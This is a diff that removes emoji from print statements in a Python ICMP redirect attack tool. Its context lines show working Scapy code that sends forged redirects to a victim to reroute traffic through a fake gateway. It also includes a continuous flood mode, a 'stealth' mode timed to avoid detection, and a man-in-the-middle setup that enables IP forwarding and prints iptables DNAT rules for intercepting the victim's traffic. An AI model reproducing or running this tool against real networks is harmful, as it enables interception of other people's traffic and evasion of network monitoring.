@@ -51,7 +51,7 @@ class ICMPRedirectAttacker:
     def display_live_stats(self):
         """Display live attack statistics"""
         while self.monitoring:
-            print(f"\r{Fore.CYAN}📊 LIVE: {self.attack_stats['redirects_sent']} redirects | {self.attack_stats['routing_changes']} route changes | {self.attack_stats['packets_captured']} packets", end='', flush=True)
+            print(f"\r{Fore.CYAN} LIVE: {self.attack_stats['redirects_sent']} redirects | {self.attack_stats['routing_changes']} route changes | {self.attack_stats['packets_captured']} packets", end='', flush=True)
             time.sleep(1)
     
     def check_ip_forward(self):
@@ -60,14 +60,14 @@ class ICMPRedirectAttacker:
             with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                 forward_status = f.read().strip()
                 if forward_status != '1':
-                    print(f"{Fore.YELLOW}⚠️  IP forwarding disabled, enabling...")
+                    print(f"{Fore.YELLOW}  IP forwarding disabled, enabling...")
                     subprocess.run(['sysctl', 'net.ipv4.ip_forward=1'], 
                                  check=True, capture_output=True)
-                    print(f"{Fore.GREEN}✅ IP forwarding enabled")
+                    print(f"{Fore.GREEN} IP forwarding enabled")
                 else:
-                    print(f"{Fore.GREEN}✅ IP forwarding already enabled")
+                    print(f"{Fore.GREEN} IP forwarding already enabled")
         except Exception as e:
-            print(f"{Fore.RED}❌ Failed to check/enable IP forwarding: {e}")
+            print(f"{Fore.RED} Failed to check/enable IP forwarding: {e}")
     
     def capture_initial_route(self, target_ip):
         """Capture initial routing information"""
@@ -75,11 +75,11 @@ class ICMPRedirectAttacker:
             result = subprocess.run(['ip', 'route', 'get', target_ip], 
                                   capture_output=True, text=True, check=True)
             self.initial_routes[target_ip] = result.stdout.strip()
-            print(f"{Fore.BLUE}📊 Initial route to {target_ip}:")
+            print(f"{Fore.BLUE} Initial route to {target_ip}:")
             print(f"   {self.initial_routes[target_ip]}")
             return True
         except subprocess.CalledProcessError:
-            print(f"{Fore.RED}❌ Failed to get route info for {target_ip}")
+            print(f"{Fore.RED} Failed to get route info for {target_ip}")
             return False
     
     def monitor_routing_changes(self, victim_ip, target_ip, duration=60):
@@ -116,16 +116,16 @@ class ICMPRedirectAttacker:
                 dst_ip = packet[IP].dst
                 
                 if icmp_type == 5:  # ICMP Redirect
-                    print(f"\n{Fore.RED}🔀 REDIRECT CAPTURED: {src_ip} → {dst_ip}")
+                    print(f"\n{Fore.RED} REDIRECT CAPTURED: {src_ip} → {dst_ip}")
                     if hasattr(packet[ICMP], 'gw'):
                         print(f"   New Gateway: {packet[ICMP].gw}")
                 elif src_ip == victim_ip:
-                    print(f"\n{Fore.BLUE}📤 VICTIM TRAFFIC: {src_ip} → {dst_ip}")
+                    print(f"\n{Fore.BLUE} VICTIM TRAFFIC: {src_ip} → {dst_ip}")
                 elif dst_ip == fake_gateway_ip:
-                    print(f"\n{Fore.GREEN}🎯 REDIRECTED TO US: {src_ip} → {dst_ip}")
+                    print(f"\n{Fore.GREEN} REDIRECTED TO US: {src_ip} → {dst_ip}")
         
         filter_str = f"icmp or (host {victim_ip}) or (host {fake_gateway_ip})"
-        print(f"{Fore.CYAN}🔍 Monitoring network traffic...")
+        print(f"{Fore.CYAN} Monitoring network traffic...")
         sniff(filter=filter_str, prn=packet_handler, timeout=duration)
     
     def send_redirect(self, victim_ip, target_ip, gateway_ip, fake_gateway_ip):
@@ -139,13 +139,13 @@ class ICMPRedirectAttacker:
                 inner_packet
             )
             
-            print(f"{Fore.RED}🚀 Sending ICMP redirect...")
-            print(f"   📋 Claiming {fake_gateway_ip} is better route to {target_ip}")
+            print(f"{Fore.RED} Sending ICMP redirect...")
+            print(f"    Claiming {fake_gateway_ip} is better route to {target_ip}")
             
             send(redirect_packet, verbose=0)
             self.attack_stats['redirects_sent'] += 1
             
-            print(f"{Fore.GREEN}✅ Redirect packet sent!")
+            print(f"{Fore.GREEN} Redirect packet sent!")
             return True
             
         except Exception as e:
@@ -160,11 +160,11 @@ class ICMPRedirectAttacker:
             fake_gateway_ip = self.fake.ipv4()
         
         self.show_banner()
-        print(f"{Fore.YELLOW}🎯 VICTIM: {victim_ip}")
-        print(f"{Fore.YELLOW}🎯 TARGET: {target_ip}")
-        print(f"{Fore.YELLOW}🚪 GATEWAY: {gateway_ip}")
-        print(f"{Fore.YELLOW}🔀 FAKE GATEWAY: {fake_gateway_ip}")
-        print(f"{Fore.YELLOW}📊 MODE: {'CONTINUOUS' if continuous else 'SINGLE'}")
+        print(f"{Fore.YELLOW} VICTIM: {victim_ip}")
+        print(f"{Fore.YELLOW} TARGET: {target_ip}")
+        print(f"{Fore.YELLOW} GATEWAY: {gateway_ip}")
+        print(f"{Fore.YELLOW} FAKE GATEWAY: {fake_gateway_ip}")
+        print(f"{Fore.YELLOW} MODE: {'CONTINUOUS' if continuous else 'SINGLE'}")
         print()
         
         # Setup
@@ -195,7 +195,7 @@ class ICMPRedirectAttacker:
         
         try:
             if continuous:
-                print(f"{Fore.RED}🔥 CONTINUOUS REDIRECT MODE - Press Ctrl+C to stop")
+                print(f"{Fore.RED} CONTINUOUS REDIRECT MODE - Press Ctrl+C to stop")
                 redirect_count = 0
                 while True:
                     self.send_redirect(victim_ip, target_ip, gateway_ip, fake_gateway_ip)
@@ -214,7 +214,7 @@ class ICMPRedirectAttacker:
                 time.sleep(duration)
         
         except KeyboardInterrupt:
-            print(f"\n{Fore.YELLOW}⚠️  Attack stopped by user")
+            print(f"\n{Fore.YELLOW}  Attack stopped by user")
         
         finally:
             self.monitoring = False
@@ -226,15 +226,15 @@ class ICMPRedirectAttacker:
         """Display final attack statistics"""
         print(f"\n\n{Fore.CYAN}📊 ATTACK SUMMARY")
         print("=" * 50)
-        print(f"🔀 Redirects sent: {self.attack_stats['redirects_sent']}")
-        print(f"🔄 Routing changes detected: {self.attack_stats['routing_changes']}")
-        print(f"📦 Packets captured: {self.attack_stats['packets_captured']}")
+        print(f" Redirects sent: {self.attack_stats['redirects_sent']}")
+        print(f" Routing changes detected: {self.attack_stats['routing_changes']}")
+        print(f" Packets captured: {self.attack_stats['packets_captured']}")
         print("=" * 50)
         
         if self.attack_stats['routing_changes'] > 0:
-            print(f"{Fore.GREEN}🎉 SUCCESS: Routing changes detected!")
+            print(f"{Fore.GREEN} SUCCESS: Routing changes detected!")
         else:
-            print(f"{Fore.YELLOW}⚠️  No routing changes detected")
+            print(f"{Fore.YELLOW}  No routing changes detected")
     
     def show_verification_steps(self, victim_ip, target_ip, fake_gateway_ip):
         """Show verification commands"""
@@ -257,42 +257,42 @@ class ICMPRedirectAttacker:
             fake_gateway_ip = self.fake.ipv4()
         
         print(f"{Fore.BLUE}🥷 STEALTH REDIRECT ATTACK")
-        print(f"🎯 Target: {victim_ip} → {target_ip}")
-        print(f"🔀 Fake Gateway: {fake_gateway_ip}")
-        print("🕐 Using stealth timing")
+        print(f" Target: {victim_ip} → {target_ip}")
+        print(f" Fake Gateway: {fake_gateway_ip}")
+        print(" Using stealth timing")
         print()
         
         # Random delays to avoid detection
         delays = [5, 8, 12, 15, 20]
         
         for i, delay in enumerate(delays):
-            print(f"📤 Sending redirect {i+1}/5 (next in {delay}s)")
+            print(f" Sending redirect {i+1}/5 (next in {delay}s)")
             self.send_redirect(victim_ip, target_ip, gateway_ip, fake_gateway_ip)
             
             if i < len(delays) - 1:
                 time.sleep(delay)
         
-        print(f"{Fore.GREEN}✅ Stealth attack completed")
+        print(f"{Fore.GREEN} Stealth attack completed")
     
     def mitm_setup(self, victim_ip, target_ip, gateway_ip):
         """Set up man-in-the-middle after successful redirect"""
         fake_gateway_ip = self.get_local_ip()
         
-        print(f"{Fore.MAGENTA}🎭 SETTING UP MAN-IN-THE-MIDDLE")
-        print(f"🔀 Using our IP as fake gateway: {fake_gateway_ip}")
+        print(f"{Fore.MAGENTA} SETTING UP MAN-IN-THE-MIDDLE")
+        print(f" Using our IP as fake gateway: {fake_gateway_ip}")
         print()
         
         # Perform redirect
         self.send_redirect(victim_ip, target_ip, gateway_ip, fake_gateway_ip)
         
         # Set up traffic forwarding
-        print(f"{Fore.CYAN}📡 Setting up traffic forwarding...")
+        print(f"{Fore.CYAN} Setting up traffic forwarding...")
         try:
             # Enable IP forwarding
             subprocess.run(['sysctl', 'net.ipv4.ip_forward=1'], check=True, capture_output=True)
             
             # Set up iptables rules for MITM (example)
-            print(f"⚙️  Configure iptables for traffic interception:")
+            print(f"   Configure iptables for traffic interception:")
             print(f"   iptables -t nat -A PREROUTING -s {victim_ip} -d {target_ip} -j DNAT --to-destination {fake_gateway_ip}")
             print(f"   iptables -t nat -A POSTROUTING -s {victim_ip} -j MASQUERADE")
             
@@ -330,7 +330,7 @@ def main():
     # Check root privileges
     if os.geteuid() != 0:
         print(f"{Fore.RED}❌ Root privileges required")
-        print(f"{Fore.YELLOW}💡 Run with: sudo python3 {sys.argv[0]} {' '.join(sys.argv[1:])}")
+        print(f"{Fore.YELLOW} Run with: sudo python3 {sys.argv[0]} {' '.join(sys.argv[1:])}")
         sys.exit(1)
     
     attacker = ICMPRedirectAttacker()
@@ -362,7 +362,7 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n{Fore.YELLOW}⚠️  Terminated by user")
+        print(f"\n{Fore.YELLOW}  Terminated by user")
         sys.exit(0)
     except Exception as e:
         print(f"\n{Fore.RED}❌ Error: {e}")
